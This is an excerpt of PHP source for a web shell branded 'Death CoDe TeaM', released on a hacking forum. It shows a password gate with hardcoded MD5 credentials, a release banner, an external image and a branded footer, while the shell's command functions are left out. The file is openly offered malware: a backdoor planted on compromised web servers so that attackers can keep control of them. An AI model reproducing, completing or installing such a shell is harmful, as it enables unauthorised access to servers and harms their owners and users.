...
$user='92a66ad67cb3497b68726d27d641b21e';
$pass='92a66ad67cb3497b68726d27d641b21e';

if($auth == 1) {
if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!==$user || md5($_SERVER['PHP_AUTH_PW'])!==$pass)
{
header('WWW-Authenticate: Basic realm="Shell Firewall"');
header('HTTP/1.0 401 Unauthorized');
exit("<h1>Access Denied By Death CoDe TeaM</h1>");
}
}

/******************************************************************************************
*  T.D.C shell released for www.vbspiders.com/vb ;)
*
*
* =
+--------------------------------------------------------+
...
<img border="0" src="http://www.balfakih.com/agb/Untitled-3.jpg" width="600" height="232">
...
<br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1><tr><td width="990" height="1" valign="top"><center>
  <b>.:[ Death CoDe TeaM.Shell |www.teamdc.ning.com & www.vbspiders.com/vb/| Version 1.0 |</font> | Generated in: <?php echo round(getmicrotime()-starttime,4); ?> ]:.</b>
<br>
</center></td></tr></table>
